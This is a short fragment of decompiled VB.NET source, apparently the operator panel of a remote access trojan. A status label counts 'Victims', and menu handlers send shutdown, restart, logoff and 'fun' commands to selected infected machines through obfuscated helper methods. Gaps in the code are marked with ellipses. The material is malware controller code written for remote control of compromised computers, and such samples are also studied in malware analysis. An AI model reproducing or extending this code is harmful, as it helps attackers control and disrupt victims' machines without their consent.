...
Label_036D:
    ...
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ...
            Me.vicz.Text = ("Victims [" & Conversions.ToString(Me.L1.RowCount) & "]")
    ...
    Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
        Dim kio As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        kio.Start(New Object() {Class6.smethod_11(("sht")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub RestartToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem2.Click
        Dim kio As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        kio.Start(New Object() {Class6.smethod_11(("rst")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogoffToolStripMenuItem.Click
        Dim kio As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        kio.Start(New Object() {Class6.smethod_11(("lof")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub FunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FunToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedRows.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"fun"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
    ...
    Private Sub ToolStripStatusLabel4_Click_1(sender As Object, e As EventArgs) Handles vicz.Click
